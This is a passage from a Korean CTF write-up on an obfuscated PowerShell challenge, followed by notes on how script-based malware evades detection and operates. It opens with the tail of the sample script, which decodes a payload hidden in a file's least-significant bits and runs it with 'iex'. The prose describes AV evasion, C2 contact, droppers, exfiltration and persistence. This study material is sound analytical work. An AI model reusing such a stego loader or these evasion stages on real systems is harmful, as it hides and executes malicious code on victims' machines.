    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$GxJnQfLkBsWrNzMpCtHyVwXkTpZyQjPtCr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PkVmJnLdQzThPwYsNcXfLuRsWvCdGmJbZtRp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LpWqXtNzJsVcKfRvQpTdBvGhXcJkMtWrXf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-band&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-bor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$GxJnQfLkBsWrNzMpCtHyVwXkTpZyQjPtCr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HtRfGpLkNqMwXsPtVzYjLpScXrJwNmTpYvQr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HtRfGpLkNqMwXsPtVzYjLpScXrJwNmTpYvQr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HtRfGpLkNqMwXsPtVzYjLpScXrJwNmTpYvQr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zy3evbzqvwtg487asgb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MpQsBnLjHtVrXpWdNgZkTqScRmVlPyKtWhXc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HtRfGpLkNqMwXsPtVzYjLpScXrJwNmTpYvQr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HfDrQxJsWzKpLtVgXpYtMnCjPkZfVrYsLcGh&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MpQsBnLjHtVrXpWdNgZkTqScRmVlPyKtWhXc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ToArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HfDrQxJsWzKpLtVgXpYtMnCjPkZfVrYsLcGh&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dfgAeJKLfgswERTfgjkl12&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MA==&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dfgAeJKLfgswERTfgjkl12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiASDfgqerdfdseN1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wertqweOPhgdfgdkl3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UG93ZXJTaGVsbA==&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$tyuIQWERTzxcfderq0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wertqweOPhgdfgdkl3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nmiHgTPOlkjyewrflp4&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiASDfgqerdfdseN1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$lkjSDfghUErtqweIOPh1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;V2VsY29tZQ==&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ghkZXCVgqwqerQWERTzx2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$lkjSDfghUErtqweIOPh1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zxcvTREWSADfghJKLre3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zxcvTREWSADfghJKLre3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-lt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nmiHgTPOlkjyewrflp4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zxcvTREWSADfghJKLre3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$jkLOIUmnhQWEfghZxcvb4&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$poiNMBcfgdqwerYxsdflq1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zxcvTREWSADfghJKLre3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$werERTOIUyNMBdfqwefp5&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;U2NyaXB0IGhhcyBlbmRlZCBleGVjdXRpb24=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zxcMNBAsdfwerXCVbnlk3&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$werERTOIUyNMBdfqwefp5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;위 스크립트는 특정 파일의 LSB를 읽어 와, 사전에 정의된 Key를 기반으로 복호화하는 스크립트다.&lt;/p&gt;

&lt;p&gt;이 지점에서 위 스크립트와 대상 파일 간의 관계에 주목했어야 했는데,&lt;/p&gt;

&lt;p&gt;더 자세히 말하자면&lt;/p&gt;

&lt;p&gt;“문제의 힌트가 LSB였으며, 특정 파일을 읽어와 복호화하네? 그렇다면 일반적으로는 전체를 복호화하겠지?”
라고 생각했어야 했는데,&lt;/p&gt;

&lt;p&gt;그렇게 생각하지 않은 점이 패인이었던 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;어쨌든… 지금 문제 라이트업을 보니, 이 문제에서 필요한 정보는 다 찾았지만 플래그를 찾지 못했던 것으로 보인다.&lt;/p&gt;

&lt;p&gt;그렇기 때문에, 문제 풀이보다는&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;‘어떤 사고의 흐름을 가져야 하는지’&lt;/li&gt;
  &lt;li&gt;‘여기에서 알아가야 할 주요 기술적 사항’&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;위 두 사항에 주안점을 두고 문제를 분석해 보려 한다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-쉘-스크립트-난독화-기법&quot;&gt;2. 쉘 스크립트 난독화 기법&lt;/h1&gt;

&lt;p&gt;난독화는 여러 가지 방식으로 진행되기 때문에, 하나하나 다루는 것은 효율이 떨어진다고 생각함&lt;/p&gt;

&lt;p&gt;즉,&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;쉘 스크립트를 활용한 악성코드는 동작 단계별로 어떤 행위가 필연적인지&lt;/li&gt;
  &lt;li&gt;그렇다면 그 행위를 역이용해서 쉘 스크립트 원본 혹은 행위를 어떻게 얻어야 하는지&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;고민하는 게 훨씬 범용적일 것 같다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-악성코드는-왜-쉘스크립트를-사용할까&quot;&gt;2.1. 악성코드는 왜 쉘스크립트를 사용할까?&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;공격자가 악성 스크립트의 활동을 숨길 수 있기 때문&lt;/p&gt;

    &lt;p&gt;→ 파워쉘은 시스템의 정상 응용이기 때문에, 파워쉘에서 악성 커맨드가 실행되어도 AV의 탐지를 우회할 수 있음&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;이렇게 시스템의 정상 응용을 활용해 악성 행위를 수행하는 기법을 ‘Living-off-the-land’ 기법으로 칭함&lt;/li&gt;
    &lt;/ul&gt;

    &lt;p&gt;→ 파워쉘을 통해 OS에서 제공하는 주요 함수에 접근할 수 있고, 추가 응용을 실행하지 않기에 매우 적은 흔적을 남기므로 탐지가 어려움&lt;/p&gt;

    &lt;p&gt;→ 파일리스 기법 악성코드가 바로 OS 스크립트 엔진을 사용해 악성행위를 수행하는 대표 예&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;22-악성코드가-쉘스크립트를-사용할-때의-동작-단계-구성&quot;&gt;2.2. 악성코드가 쉘스크립트를 사용할 때의 동작 단계 구성&lt;/h2&gt;

&lt;p&gt;악성코드가 이미 설치된 상황을 가정하고 아래 단계를 서술했다. 내 경험적 지식에 의존해 서술하는 것이므로, 얼마든지 예외 혹은 틀린 설명이 있을 수 있다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;정보 복호화&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;부수적 파일이 없음
        &lt;ul&gt;
          &lt;li&gt;
            &lt;p&gt;파일을 사용하지 않고, 명령어만 이용&lt;/p&gt;

            &lt;p&gt;⇒ 파워쉘에서 명령어 실행 흔적이 비교적 투명하게 남음&lt;/p&gt;

            &lt;p&gt;⇒ 이때 보통 내부에 암호화해 가지고 있던 데이터를 복호화 및 실행하는 경우가 많음&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;부수적 파일이 필요함
        &lt;ul&gt;
          &lt;li&gt;
            &lt;p&gt;파일을 디스크에 쓰지 않으나, 특정 파일을 간접적으로 사용&lt;/p&gt;

            &lt;p&gt;⇒ 파워쉘에서 해당 파일을 참조한 흔적이 남음&lt;/p&gt;

            &lt;p&gt;⇒ 해당 파일을 이용해 데이터를 추출 및 복호화, 실행함&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;부수적 파일을 만듦
        &lt;ul&gt;
          &lt;li&gt;
            &lt;p&gt;지속성 확보를 위해 파일 쓰기 동작 발생&lt;/p&gt;

            &lt;p&gt;⇒ 공격 종료 후에 레지스트리 키 혹은 파일을 생성 및 변조함&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;C2 접속&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;1에서 복호화한 정보 중에 C2 서버의 주소가 있는 경우가 있음&lt;/li&gt;
      &lt;li&gt;C2서버와의 소켓 통신 연결을 하기 이전에 C2서버 주소 획득을 위해 대칭키 복호화 등의 행위를 하는 경우가 있음
        &lt;ul&gt;
          &lt;li&gt;1.a.에서 암호화해 가지고 있던 데이터가 단순 인코딩된 것이 아니라, 대칭키 암호화 되었을 경우&lt;/li&gt;
          &lt;li&gt;1.b.에서 복호화한 데이터를 pipe 혹은 실행 인자로 전달받는 시점에서 대칭키 암호화 되어 있는 경우&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;보통 이러면 패킷 캡쳐하면 되지 않나? 하지만,
        &lt;ul&gt;
          &lt;li&gt;공격자들도 바보가 아니기 때문에 와이어샤크 등의 패킷 캡쳐 프로그램을 탐지할 경우 프로그램이 종료되도록 루틴을 만듦&lt;/li&gt;
          &lt;li&gt;이러면 또 샌드박스에 넣고 돌리거나, VM에 넣고 돌려서 해당 VM의 네트워크 어댑터의 활동을 호스트에서 관찰하거나 하는 방식을 써서 파훼 가능&lt;/li&gt;
          &lt;li&gt;그래서(이것만이 원인은 아니지만) 또 공격자들은 anti-VM 및 anti-Sandbox 기법을 씀&lt;/li&gt;
          &lt;li&gt;또 이걸 파훼하기 위해….&lt;/li&gt;
          &lt;li&gt;대충 이런 상황입니다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;제일 속 편한 건 복호화 루틴 가지고 하네스를 만들어서 거기에 암호화된 데이터를 돌리는 것이죠…
        &lt;ul&gt;
          &lt;li&gt;그러나 이걸 하려면 리버싱으로 복호화 루틴을 복원해야 함&lt;/li&gt;
          &lt;li&gt;딱히 해결 방법은 없고 그냥 하는 거지 뭐…&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;근데 또 그러면 암호화된 데이터의 복호화 키를 어떻게 얻을 것인가?
        &lt;ul&gt;
          &lt;li&gt;지금 복호화 키를 C2에 요청하는 게 적법한 클라이언트인가? 의 질문으로 귀결됨&lt;/li&gt;
          &lt;li&gt;그럼 사전 인증을 진행해야 할 텐데, 아직까지 내가 아는 한은 prepared-key 방식으로 인증을 진행함&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;행위 수행을 위한 코드 다운로드 or 드롭&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;C2에게 받아온 코드를 다운로드하거나 드로핑한다.
        &lt;ul&gt;
          &lt;li&gt;다운로더는 인터넷을 통해 악성파일을 받아온 후 실행한 로그가 파워쉘 로그에 남아있을 가능성이 높음&lt;/li&gt;
          &lt;li&gt;드로퍼는 스스로를 복호화하는 루틴을 통해 악성코드를 복호화하고, 이를 실행함
            &lt;ul&gt;
              &lt;li&gt;이것도 파워쉘 로그를 보면 흔적이 남아 있을 가능성이 높음&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;악성 행위 수행&lt;/strong&gt;
    &lt;ol&gt;
      &lt;li&gt;정보 유출
        &lt;ul&gt;
          &lt;li&gt;파워쉘을 통해 특정 파일을 원격지 서버에 업로드하거나&lt;/li&gt;
          &lt;li&gt;타 응용을 설치해 특정 파일을 원격지 서버에 업로드하거나&lt;/li&gt;
          &lt;li&gt;아무튼 이것도 파워쉘 로그를 보면 흔적이 남아 있을 가능성이 높고, 아니라 하더라도 맥락을 따라가다 보면 응용 프로그램 로그에서 흔적을 찾을 가능성이 있음&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;시스템 마비
        &lt;ol&gt;
          &lt;li&gt;암호화
            &lt;ul&gt;
              &lt;li&gt;이건 이제 암호화 루틴을 찾아내고… 이하 생략이다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ol&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;지속성 확보&lt;/strong&gt;
    &lt;ul&gt;
